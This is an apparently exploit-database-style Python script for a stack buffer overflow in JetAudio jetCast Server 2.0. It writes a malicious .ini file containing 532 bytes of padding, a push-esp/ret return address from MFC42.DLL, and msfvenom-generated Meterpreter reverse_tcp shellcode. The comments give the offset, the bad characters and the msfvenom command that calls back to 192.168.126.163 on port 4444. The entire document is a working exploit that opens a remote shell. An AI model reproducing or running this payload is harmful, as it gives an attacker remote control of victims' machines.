# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in JetAudio jetCast Server 2.0. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

#[*] Exact match at offset 532
#   0x5f49948d : push esp # ret  |  {PAGE_EXECUTE_READ} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.00.8665.0 (C:\Program Files\JetCast Server\MFC42.DLL)
# badchars: \x00\x0A\x0D
# shellcode command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.163 LPORT=4444 -b '\x00\x0A\x0D' -f python -v scode


filename = "jetcastexp.ini"

scode =  ""
scode += "\xbd\x3f\xee\xfe\x96\xdb\xc1\xd9\x74\x24\xf4\x58\x2b"
scode += "\xc9\xb1\x56\x31\x68\x13\x83\xe8\xfc\x03\x68\x30\x0c"
scode += "\x0b\x6a\xa6\x52\xf4\x93\x36\x33\x7c\x76\x07\x73\x1a"
scode += "\xf2\x37\x43\x68\x56\xbb\x28\x3c\x43\x48\x5c\xe9\x64"
scode += "\xf9\xeb\xcf\x4b\xfa\x40\x33\xcd\x78\x9b\x60\x2d\x41"
scode += "\x54\x75\x2c\x86\x89\x74\x7c\x5f\xc5\x2b\x91\xd4\x93"
scode += "\xf7\x1a\xa6\x32\x70\xfe\x7e\x34\x51\x51\xf5\x6f\x71"
scode += "\x53\xda\x1b\x38\x4b\x3f\x21\xf2\xe0\x8b\xdd\x05\x21"
scode += "\xc2\x1e\xa9\x0c\xeb\xec\xb3\x49\xcb\x0e\xc6\xa3\x28"
scode += "\xb2\xd1\x77\x53\x68\x57\x6c\xf3\xfb\xcf\x48\x02\x2f"
scode += "\x89\x1b\x08\x84\xdd\x44\x0c\x1b\x31\xff\x28\x90\xb4"
scode += "\xd0\xb9\xe2\x92\xf4\xe2\xb1\xbb\xad\x4e\x17\xc3\xae"
scode += "\x31\xc8\x61\xa4\xdf\x1d\x18\xe7\xb7\xd2\x11\x18\x47"
scode += "\x7d\x21\x6b\x75\x22\x99\xe3\x35\xab\x07\xf3\x4c\xbb"
scode += "\xb7\x2b\xf6\xac\x49\xcc\x06\xe4\x8d\x98\x56\x9e\x24"
scode += "\xa1\x3d\x5e\xc8\x74\xab\x54\x5e\xb7\x83\x17\x3d\x5f"
scode += "\xd1\xe7\x50\xfc\x5c\x01\x02\xac\x0e\x9e\xe3\x1c\xee"
scode += "\x4e\x8c\x76\xe1\xb1\xac\x78\x28\xda\x47\x97\x84\xb2"
scode += "\xff\x0e\x8d\x49\x61\xce\x18\x34\xa1\x44\xa8\xc8\x6c"
scode += "\xad\xd9\xda\x99\xca\x21\x23\x5a\x7f\x21\x49\x5e\x29"
scode += "\x76\xe5\x5c\x0c\xb0\xaa\x9f\x7b\xc3\xad\x60\xfa\xf5"
scode += "\xc6\x57\x68\xb9\xb0\x97\x7c\x39\x41\xce\x16\x39\x29"
scode += "\xb6\x42\x6a\x4c\xb9\x5e\x1f\xdd\x2c\x61\x49\xb1\xe7"
scode += "\x09\x77\xec\xc0\x95\x88\xdb\x52\xd1\x76\x99\x7c\x7a"
scode += "\x1e\x61\x3d\x7a\xde\x0b\xbd\x2a\xb6\xc0\x92\xc5\x76"
scode += "\x28\x39\x8e\x1e\xa3\xac\x7c\xbf\xb4\xe4\x21\x61\xb4"
scode += "\x0b\xfa\x92\xcf\x64\xfd\x53\x30\x6d\x9a\x54\x30\x91"
scode += "\x9c\x69\xe6\xa8\xea\xac\x3a\x8f\xe5\x9b\x1f\xa6\x6f"
scode += "\xe3\x0c\xb8\xa5"


evilString = "A" * 532 + "\x8D\x94\x49\x5f" + "\x90" * 10 + "\x58\x89\xE0\x83\xE8\x64\x89\xC4" + "\x90" *10 + scode + "\x90" * 1000

file = open(filename,'w')
file.write(evilString)
file.close()
